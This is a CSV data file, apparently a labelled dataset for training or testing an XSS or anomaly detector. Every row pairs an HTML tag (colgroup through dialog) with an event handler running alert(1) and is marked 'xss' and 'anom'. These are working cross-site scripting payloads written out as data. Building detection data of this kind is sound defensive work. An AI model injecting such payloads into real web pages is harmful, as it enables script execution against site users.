payload,attack_type,label
"<colgroup onkeydown=""alert(1)"" contenteditable>test</colgroup>",xss,anom
"<colgroup onkeypress=""alert(1)"" contenteditable>test</colgroup>",xss,anom
"<colgroup onkeyup=""alert(1)"" contenteditable>test</colgroup>",xss,anom
"<colgroup onmousedown=""alert(1)"">test</colgroup>",xss,anom
"<colgroup onmouseenter=""alert(1)"">test</colgroup>",xss,anom
"<colgroup onmouseleave=""alert(1)"">test</colgroup>",xss,anom
"<colgroup onmousemove=""alert(1)"">test</colgroup>",xss,anom
"<colgroup onmouseout=""alert(1)"">test</colgroup>",xss,anom
"<colgroup onmouseover=""alert(1)"">test</colgroup>",xss,anom
"<colgroup onmouseup=""alert(1)"">test</colgroup>",xss,anom
"<colgroup onpaste=""alert(1)"" contenteditable>test</colgroup>",xss,anom
"<command draggable=""true"" ondrag=""alert(1)"">test</command>",xss,anom
"<command draggable=""true"" ondragend=""alert(1)"">test</command>",xss,anom
"<command draggable=""true"" ondragenter=""alert(1)"">test</command>",xss,anom
"<command draggable=""true"" ondragleave=""alert(1)"">test</command>",xss,anom
"<command draggable=""true"" ondragstart=""alert(1)"">test</command>",xss,anom
<command id=x tabindex=1 onactivate=alert(1)></command>,xss,anom
<command id=x tabindex=1 onbeforeactivate=alert(1)></command>,xss,anom
<command id=x tabindex=1 onbeforedeactivate=alert(1)></command><input autofocus>,xss,anom
<command id=x tabindex=1 ondeactivate=alert(1)></command><input id=y autofocus>,xss,anom
<command id=x tabindex=1 onfocus=alert(1)></command>,xss,anom
<command id=x tabindex=1 onfocusin=alert(1)></command>,xss,anom
"<command onbeforecopy=""alert(1)"" contenteditable>test</command>",xss,anom
"<command onbeforecut=""alert(1)"" contenteditable>test</command>",xss,anom
"<command onbeforepaste=""alert(1)"" contenteditable>test</command>",xss,anom
<command onblur=alert(1) tabindex=1 id=x></command><input autofocus>,xss,anom
"<command onclick=""alert(1)"">test</command>",xss,anom
"<command oncontextmenu=""alert(1)"">test</command>",xss,anom
"<command oncopy=""alert(1)"" contenteditable>test</command>",xss,anom
"<command oncut=""alert(1)"" contenteditable>test</command>",xss,anom
"<command ondblclick=""alert(1)"">test</command>",xss,anom
<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>,xss,anom
"<command onkeydown=""alert(1)"" contenteditable>test</command>",xss,anom
"<command onkeypress=""alert(1)"" contenteditable>test</command>",xss,anom
"<command onkeyup=""alert(1)"" contenteditable>test</command>",xss,anom
"<command onmousedown=""alert(1)"">test</command>",xss,anom
"<command onmouseenter=""alert(1)"">test</command>",xss,anom
"<command onmouseleave=""alert(1)"">test</command>",xss,anom
"<command onmousemove=""alert(1)"">test</command>",xss,anom
"<command onmouseout=""alert(1)"">test</command>",xss,anom
"<command onmouseover=""alert(1)"">test</command>",xss,anom
"<command onmouseup=""alert(1)"">test</command>",xss,anom
"<command onpaste=""alert(1)"" contenteditable>test</command>",xss,anom
"<content draggable=""true"" ondrag=""alert(1)"">test</content>",xss,anom
"<content draggable=""true"" ondragend=""alert(1)"">test</content>",xss,anom
"<content draggable=""true"" ondragenter=""alert(1)"">test</content>",xss,anom
"<content draggable=""true"" ondragleave=""alert(1)"">test</content>",xss,anom
"<content draggable=""true"" ondragstart=""alert(1)"">test</content>",xss,anom
<content id=x tabindex=1 onactivate=alert(1)></content>,xss,anom
<content id=x tabindex=1 onbeforeactivate=alert(1)></content>,xss,anom
<content id=x tabindex=1 onbeforedeactivate=alert(1)></content><input autofocus>,xss,anom
<content id=x tabindex=1 ondeactivate=alert(1)></content><input id=y autofocus>,xss,anom
<content id=x tabindex=1 onfocus=alert(1)></content>,xss,anom
<content id=x tabindex=1 onfocusin=alert(1)></content>,xss,anom
"<content onbeforecopy=""alert(1)"" contenteditable>test</content>",xss,anom
"<content onbeforecut=""alert(1)"" contenteditable>test</content>",xss,anom
"<content onbeforepaste=""alert(1)"" contenteditable>test</content>",xss,anom
<content onblur=alert(1) tabindex=1 id=x></content><input autofocus>,xss,anom
"<content onclick=""alert(1)"">test</content>",xss,anom
"<content oncontextmenu=""alert(1)"">test</content>",xss,anom
"<content oncopy=""alert(1)"" contenteditable>test</content>",xss,anom
"<content oncut=""alert(1)"" contenteditable>test</content>",xss,anom
"<content ondblclick=""alert(1)"">test</content>",xss,anom
<content onfocusout=alert(1) tabindex=1 id=x></content><input autofocus>,xss,anom
"<content onkeydown=""alert(1)"" contenteditable>test</content>",xss,anom
"<content onkeypress=""alert(1)"" contenteditable>test</content>",xss,anom
"<content onkeyup=""alert(1)"" contenteditable>test</content>",xss,anom
"<content onmousedown=""alert(1)"">test</content>",xss,anom
"<content onmouseenter=""alert(1)"">test</content>",xss,anom
"<content onmouseleave=""alert(1)"">test</content>",xss,anom
"<content onmousemove=""alert(1)"">test</content>",xss,anom
"<content onmouseout=""alert(1)"">test</content>",xss,anom
"<content onmouseover=""alert(1)"">test</content>",xss,anom
"<content onmouseup=""alert(1)"">test</content>",xss,anom
"<content onpaste=""alert(1)"" contenteditable>test</content>",xss,anom
"<data draggable=""true"" ondrag=""alert(1)"">test</data>",xss,anom
"<data draggable=""true"" ondragend=""alert(1)"">test</data>",xss,anom
"<data draggable=""true"" ondragenter=""alert(1)"">test</data>",xss,anom
"<data draggable=""true"" ondragleave=""alert(1)"">test</data>",xss,anom
"<data draggable=""true"" ondragstart=""alert(1)"">test</data>",xss,anom
<data id=x tabindex=1 onactivate=alert(1)></data>,xss,anom
<data id=x tabindex=1 onbeforeactivate=alert(1)></data>,xss,anom
<data id=x tabindex=1 onbeforedeactivate=alert(1)></data><input autofocus>,xss,anom
<data id=x tabindex=1 ondeactivate=alert(1)></data><input id=y autofocus>,xss,anom
<data id=x tabindex=1 onfocus=alert(1)></data>,xss,anom
<data id=x tabindex=1 onfocusin=alert(1)></data>,xss,anom
"<data onbeforecopy=""alert(1)"" contenteditable>test</data>",xss,anom
"<data onbeforecut=""alert(1)"" contenteditable>test</data>",xss,anom
"<data onbeforepaste=""alert(1)"" contenteditable>test</data>",xss,anom
<data onblur=alert(1) tabindex=1 id=x></data><input autofocus>,xss,anom
"<data onclick=""alert(1)"">test</data>",xss,anom
"<data oncontextmenu=""alert(1)"">test</data>",xss,anom
"<data oncopy=""alert(1)"" contenteditable>test</data>",xss,anom
"<data oncut=""alert(1)"" contenteditable>test</data>",xss,anom
"<data ondblclick=""alert(1)"">test</data>",xss,anom
<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>,xss,anom
"<data onkeydown=""alert(1)"" contenteditable>test</data>",xss,anom
"<data onkeypress=""alert(1)"" contenteditable>test</data>",xss,anom
"<data onkeyup=""alert(1)"" contenteditable>test</data>",xss,anom
"<data onmousedown=""alert(1)"">test</data>",xss,anom
"<data onmouseenter=""alert(1)"">test</data>",xss,anom
"<data onmouseleave=""alert(1)"">test</data>",xss,anom
"<data onmousemove=""alert(1)"">test</data>",xss,anom
"<data onmouseout=""alert(1)"">test</data>",xss,anom
"<data onmouseover=""alert(1)"">test</data>",xss,anom
"<data onmouseup=""alert(1)"">test</data>",xss,anom
"<data onpaste=""alert(1)"" contenteditable>test</data>",xss,anom
"<datalist draggable=""true"" ondrag=""alert(1)"">test</datalist>",xss,anom
"<datalist draggable=""true"" ondragend=""alert(1)"">test</datalist>",xss,anom
"<datalist draggable=""true"" ondragenter=""alert(1)"">test</datalist>",xss,anom
"<datalist draggable=""true"" ondragleave=""alert(1)"">test</datalist>",xss,anom
"<datalist draggable=""true"" ondragstart=""alert(1)"">test</datalist>",xss,anom
<datalist id=x tabindex=1 onactivate=alert(1)></datalist>,xss,anom
<datalist id=x tabindex=1 onbeforeactivate=alert(1)></datalist>,xss,anom
<datalist id=x tabindex=1 onbeforedeactivate=alert(1)></datalist><input autofocus>,xss,anom
<datalist id=x tabindex=1 ondeactivate=alert(1)></datalist><input id=y autofocus>,xss,anom
<datalist id=x tabindex=1 onfocus=alert(1)></datalist>,xss,anom
<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>,xss,anom
"<datalist onbeforecopy=""alert(1)"" contenteditable>test</datalist>",xss,anom
"<datalist onbeforecut=""alert(1)"" contenteditable>test</datalist>",xss,anom
"<datalist onbeforepaste=""alert(1)"" contenteditable>test</datalist>",xss,anom
<datalist onblur=alert(1) tabindex=1 id=x></datalist><input autofocus>,xss,anom
"<datalist onclick=""alert(1)"">test</datalist>",xss,anom
"<datalist oncontextmenu=""alert(1)"">test</datalist>",xss,anom
"<datalist oncopy=""alert(1)"" contenteditable>test</datalist>",xss,anom
"<datalist oncut=""alert(1)"" contenteditable>test</datalist>",xss,anom
"<datalist ondblclick=""alert(1)"">test</datalist>",xss,anom
<datalist onfocusout=alert(1) tabindex=1 id=x></datalist><input autofocus>,xss,anom
"<datalist onkeydown=""alert(1)"" contenteditable>test</datalist>",xss,anom
"<datalist onkeypress=""alert(1)"" contenteditable>test</datalist>",xss,anom
"<datalist onkeyup=""alert(1)"" contenteditable>test</datalist>",xss,anom
"<datalist onmousedown=""alert(1)"">test</datalist>",xss,anom
"<datalist onmouseenter=""alert(1)"">test</datalist>",xss,anom
"<datalist onmouseleave=""alert(1)"">test</datalist>",xss,anom
"<datalist onmousemove=""alert(1)"">test</datalist>",xss,anom
"<datalist onmouseout=""alert(1)"">test</datalist>",xss,anom
"<datalist onmouseover=""alert(1)"">test</datalist>",xss,anom
"<datalist onmouseup=""alert(1)"">test</datalist>",xss,anom
"<datalist onpaste=""alert(1)"" contenteditable>test</datalist>",xss,anom
"<dd draggable=""true"" ondrag=""alert(1)"">test</dd>",xss,anom
"<dd draggable=""true"" ondragend=""alert(1)"">test</dd>",xss,anom
"<dd draggable=""true"" ondragenter=""alert(1)"">test</dd>",xss,anom
"<dd draggable=""true"" ondragleave=""alert(1)"">test</dd>",xss,anom
"<dd draggable=""true"" ondragstart=""alert(1)"">test</dd>",xss,anom
<dd id=x tabindex=1 onactivate=alert(1)></dd>,xss,anom
<dd id=x tabindex=1 onbeforeactivate=alert(1)></dd>,xss,anom
<dd id=x tabindex=1 onbeforedeactivate=alert(1)></dd><input autofocus>,xss,anom
<dd id=x tabindex=1 ondeactivate=alert(1)></dd><input id=y autofocus>,xss,anom
<dd id=x tabindex=1 onfocus=alert(1)></dd>,xss,anom
<dd id=x tabindex=1 onfocusin=alert(1)></dd>,xss,anom
"<dd onbeforecopy=""alert(1)"" contenteditable>test</dd>",xss,anom
"<dd onbeforecut=""alert(1)"" contenteditable>test</dd>",xss,anom
"<dd onbeforepaste=""alert(1)"" contenteditable>test</dd>",xss,anom
<dd onblur=alert(1) tabindex=1 id=x></dd><input autofocus>,xss,anom
"<dd onclick=""alert(1)"">test</dd>",xss,anom
"<dd oncontextmenu=""alert(1)"">test</dd>",xss,anom
"<dd oncopy=""alert(1)"" contenteditable>test</dd>",xss,anom
"<dd oncut=""alert(1)"" contenteditable>test</dd>",xss,anom
"<dd ondblclick=""alert(1)"">test</dd>",xss,anom
<dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>,xss,anom
"<dd onkeydown=""alert(1)"" contenteditable>test</dd>",xss,anom
"<dd onkeypress=""alert(1)"" contenteditable>test</dd>",xss,anom
"<dd onkeyup=""alert(1)"" contenteditable>test</dd>",xss,anom
"<dd onmousedown=""alert(1)"">test</dd>",xss,anom
"<dd onmouseenter=""alert(1)"">test</dd>",xss,anom
"<dd onmouseleave=""alert(1)"">test</dd>",xss,anom
"<dd onmousemove=""alert(1)"">test</dd>",xss,anom
"<dd onmouseout=""alert(1)"">test</dd>",xss,anom
"<dd onmouseover=""alert(1)"">test</dd>",xss,anom
"<dd onmouseup=""alert(1)"">test</dd>",xss,anom
"<dd onpaste=""alert(1)"" contenteditable>test</dd>",xss,anom
"<del draggable=""true"" ondrag=""alert(1)"">test</del>",xss,anom
"<del draggable=""true"" ondragend=""alert(1)"">test</del>",xss,anom
"<del draggable=""true"" ondragenter=""alert(1)"">test</del>",xss,anom
"<del draggable=""true"" ondragleave=""alert(1)"">test</del>",xss,anom
"<del draggable=""true"" ondragstart=""alert(1)"">test</del>",xss,anom
<del id=x tabindex=1 onactivate=alert(1)></del>,xss,anom
<del id=x tabindex=1 onbeforeactivate=alert(1)></del>,xss,anom
<del id=x tabindex=1 onbeforedeactivate=alert(1)></del><input autofocus>,xss,anom
<del id=x tabindex=1 ondeactivate=alert(1)></del><input id=y autofocus>,xss,anom
<del id=x tabindex=1 onfocus=alert(1)></del>,xss,anom
<del id=x tabindex=1 onfocusin=alert(1)></del>,xss,anom
"<del onbeforecopy=""alert(1)"" contenteditable>test</del>",xss,anom
"<del onbeforecut=""alert(1)"" contenteditable>test</del>",xss,anom
"<del onbeforepaste=""alert(1)"" contenteditable>test</del>",xss,anom
<del onblur=alert(1) tabindex=1 id=x></del><input autofocus>,xss,anom
"<del onclick=""alert(1)"">test</del>",xss,anom
"<del oncontextmenu=""alert(1)"">test</del>",xss,anom
"<del oncopy=""alert(1)"" contenteditable>test</del>",xss,anom
"<del oncut=""alert(1)"" contenteditable>test</del>",xss,anom
"<del ondblclick=""alert(1)"">test</del>",xss,anom
<del onfocusout=alert(1) tabindex=1 id=x></del><input autofocus>,xss,anom
"<del onkeydown=""alert(1)"" contenteditable>test</del>",xss,anom
"<del onkeypress=""alert(1)"" contenteditable>test</del>",xss,anom
"<del onkeyup=""alert(1)"" contenteditable>test</del>",xss,anom
"<del onmousedown=""alert(1)"">test</del>",xss,anom
"<del onmouseenter=""alert(1)"">test</del>",xss,anom
"<del onmouseleave=""alert(1)"">test</del>",xss,anom
"<del onmousemove=""alert(1)"">test</del>",xss,anom
"<del onmouseout=""alert(1)"">test</del>",xss,anom
"<del onmouseover=""alert(1)"">test</del>",xss,anom
"<del onmouseup=""alert(1)"">test</del>",xss,anom
"<del onpaste=""alert(1)"" contenteditable>test</del>",xss,anom
"<details draggable=""true"" ondrag=""alert(1)"">test</details>",xss,anom
"<details draggable=""true"" ondragend=""alert(1)"">test</details>",xss,anom
"<details draggable=""true"" ondragenter=""alert(1)"">test</details>",xss,anom
"<details draggable=""true"" ondragleave=""alert(1)"">test</details>",xss,anom
"<details draggable=""true"" ondragstart=""alert(1)"">test</details>",xss,anom
<details id=x tabindex=1 onactivate=alert(1)></details>,xss,anom
<details id=x tabindex=1 onbeforeactivate=alert(1)></details>,xss,anom
<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>,xss,anom
<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>,xss,anom
<details id=x tabindex=1 onfocus=alert(1)></details>,xss,anom
<details id=x tabindex=1 onfocusin=alert(1)></details>,xss,anom
"<details onbeforecopy=""alert(1)"" contenteditable>test</details>",xss,anom
"<details onbeforecut=""alert(1)"" contenteditable>test</details>",xss,anom
"<details onbeforepaste=""alert(1)"" contenteditable>test</details>",xss,anom
<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>,xss,anom
"<details onclick=""alert(1)"">test</details>",xss,anom
"<details oncontextmenu=""alert(1)"">test</details>",xss,anom
"<details oncopy=""alert(1)"" contenteditable>test</details>",xss,anom
"<details oncut=""alert(1)"" contenteditable>test</details>",xss,anom
"<details ondblclick=""alert(1)"">test</details>",xss,anom
<details onfocusout=alert(1) tabindex=1 id=x></details><input autofocus>,xss,anom
"<details onkeydown=""alert(1)"" contenteditable>test</details>",xss,anom
"<details onkeypress=""alert(1)"" contenteditable>test</details>",xss,anom
"<details onkeyup=""alert(1)"" contenteditable>test</details>",xss,anom
"<details onmousedown=""alert(1)"">test</details>",xss,anom
"<details onmouseenter=""alert(1)"">test</details>",xss,anom
"<details onmouseleave=""alert(1)"">test</details>",xss,anom
"<details onmousemove=""alert(1)"">test</details>",xss,anom
"<details onmouseout=""alert(1)"">test</details>",xss,anom
"<details onmouseover=""alert(1)"">test</details>",xss,anom
"<details onmouseup=""alert(1)"">test</details>",xss,anom
"<details onpaste=""alert(1)"" contenteditable>test</details>",xss,anom
<details ontoggle=alert(1) open>test</details>,xss,anom
"<dfn draggable=""true"" ondrag=""alert(1)"">test</dfn>",xss,anom
"<dfn draggable=""true"" ondragend=""alert(1)"">test</dfn>",xss,anom
"<dfn draggable=""true"" ondragenter=""alert(1)"">test</dfn>",xss,anom
"<dfn draggable=""true"" ondragleave=""alert(1)"">test</dfn>",xss,anom
"<dfn draggable=""true"" ondragstart=""alert(1)"">test</dfn>",xss,anom
<dfn id=x tabindex=1 onactivate=alert(1)></dfn>,xss,anom
<dfn id=x tabindex=1 onbeforeactivate=alert(1)></dfn>,xss,anom
<dfn id=x tabindex=1 onbeforedeactivate=alert(1)></dfn><input autofocus>,xss,anom
<dfn id=x tabindex=1 ondeactivate=alert(1)></dfn><input id=y autofocus>,xss,anom
<dfn id=x tabindex=1 onfocus=alert(1)></dfn>,xss,anom
<dfn id=x tabindex=1 onfocusin=alert(1)></dfn>,xss,anom
"<dfn onbeforecopy=""alert(1)"" contenteditable>test</dfn>",xss,anom
"<dfn onbeforecut=""alert(1)"" contenteditable>test</dfn>",xss,anom
"<dfn onbeforepaste=""alert(1)"" contenteditable>test</dfn>",xss,anom
<dfn onblur=alert(1) tabindex=1 id=x></dfn><input autofocus>,xss,anom
"<dfn onclick=""alert(1)"">test</dfn>",xss,anom
"<dfn oncontextmenu=""alert(1)"">test</dfn>",xss,anom
"<dfn oncopy=""alert(1)"" contenteditable>test</dfn>",xss,anom
"<dfn oncut=""alert(1)"" contenteditable>test</dfn>",xss,anom
"<dfn ondblclick=""alert(1)"">test</dfn>",xss,anom
<dfn onfocusout=alert(1) tabindex=1 id=x></dfn><input autofocus>,xss,anom
"<dfn onkeydown=""alert(1)"" contenteditable>test</dfn>",xss,anom
"<dfn onkeypress=""alert(1)"" contenteditable>test</dfn>",xss,anom
"<dfn onkeyup=""alert(1)"" contenteditable>test</dfn>",xss,anom
"<dfn onmousedown=""alert(1)"">test</dfn>",xss,anom
"<dfn onmouseenter=""alert(1)"">test</dfn>",xss,anom
"<dfn onmouseleave=""alert(1)"">test</dfn>",xss,anom
"<dfn onmousemove=""alert(1)"">test</dfn>",xss,anom
"<dfn onmouseout=""alert(1)"">test</dfn>",xss,anom
"<dfn onmouseover=""alert(1)"">test</dfn>",xss,anom
"<dfn onmouseup=""alert(1)"">test</dfn>",xss,anom
"<dfn onpaste=""alert(1)"" contenteditable>test</dfn>",xss,anom
"<dialog draggable=""true"" ondrag=""alert(1)"">test</dialog>",xss,anom
"<dialog draggable=""true"" ondragend=""alert(1)"">test</dialog>",xss,anom
"<dialog draggable=""true"" ondragenter=""alert(1)"">test</dialog>",xss,anom
"<dialog draggable=""true"" ondragleave=""alert(1)"">test</dialog>",xss,anom
"<dialog draggable=""true"" ondragstart=""alert(1)"">test</dialog>",xss,anom
<dialog id=x tabindex=1 onactivate=alert(1)></dialog>,xss,anom
